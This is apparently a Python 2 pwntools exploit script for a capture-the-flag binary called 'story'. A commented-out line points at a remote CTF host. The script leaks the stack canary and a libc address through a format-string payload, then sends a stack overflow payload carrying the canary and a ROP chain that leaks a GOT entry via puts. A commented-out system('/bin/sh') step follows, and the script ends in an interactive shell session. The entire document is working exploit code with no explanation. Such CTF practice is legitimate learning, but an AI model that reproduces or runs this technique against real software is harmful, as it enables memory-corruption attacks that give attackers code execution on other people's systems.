from pwn import *

sh=process('./story')
elf = ELF('./story')

#sh=remote('ctf3.linkedbyx.com','11065')
sh.recvuntil('ID:')
pay1='%15$lx,%25$p'
sh.sendline(pay1)
sh.recvuntil('Hello ')
gdb.attach(sh)
canary = sh.recvuntil(',',drop=True)
print canary
libc_base = int(sh.recvuntil('\n',drop=True),16)-0x20830
print libc_base

#gdb.attach(sh)
sh.recvuntil('story:')
sh.sendline(str(0x90))

sh.recvuntil('story:')
pop_rdi_ret = 0x400bd3
system_off = 0x45390
binsh_off = 0x18cd57

system_addr = libc_base +system_off
binsh_addr = libc_base + binsh_off

pay2='a'*0x88+p64(int("0x"+canary,16))+'bbbbbbbb'+p64(pop_rdi_ret)+p64(elf.got['__libc_start_main'])+p64(elf.symbols['puts'])#+p64(binsh_addr)+p64(system_addr)
sh.sendline(pay2)
print sh.recv()

sh.interactive()

